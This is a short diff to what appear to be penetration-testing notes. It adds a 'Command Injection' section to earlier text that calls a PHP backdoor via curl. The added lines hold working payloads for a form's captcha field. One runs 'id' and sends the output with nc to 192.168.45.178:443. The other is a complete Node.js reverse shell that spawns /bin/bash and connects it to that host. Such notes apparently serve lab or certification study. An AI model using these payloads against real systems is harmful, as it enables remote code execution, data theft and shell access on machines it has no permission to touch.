@@ -610,3 +610,10 @@ It is recommended to automatically encode curl requests by using the --url-encod
 ```bash
 kali@kali:~$ curl http://192.168.50.11/project/uploads/users/420919-backdoor.php --data-urlencode "cmd=which nc"
 ```
+
+#### Command Injection
+
+```bash
+full_name=admin&address=admin&card=admin&cvc=111&date=2222&captcha=require('child_process').exec('id|nc+192.168.45.178 443')
+captcha=3;(function(){var net = require("net"),cp = require("child_process"),sh = cp.spawn("/bin/bash", []);var client = new net.Socket();client.connect(443, "192.168.45.178", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})()
+```
